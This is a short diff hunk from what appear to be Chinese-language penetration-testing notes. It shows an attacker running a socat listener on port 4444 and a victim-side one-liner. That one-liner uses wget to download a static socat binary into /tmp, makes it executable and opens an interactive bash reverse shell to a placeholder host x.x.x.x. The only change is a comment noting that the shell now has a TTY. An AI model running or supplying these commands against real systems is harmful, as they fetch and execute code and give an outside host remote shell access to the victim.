@@ -116,7 +116,7 @@ hacker: 监听port
 
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat file:`tty`,raw,echo=0 tcp-listen:4444
 
-victims：弹shell 下载编译exp
+victims：弹带TTY shell 下载编译exp
 
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4444
 
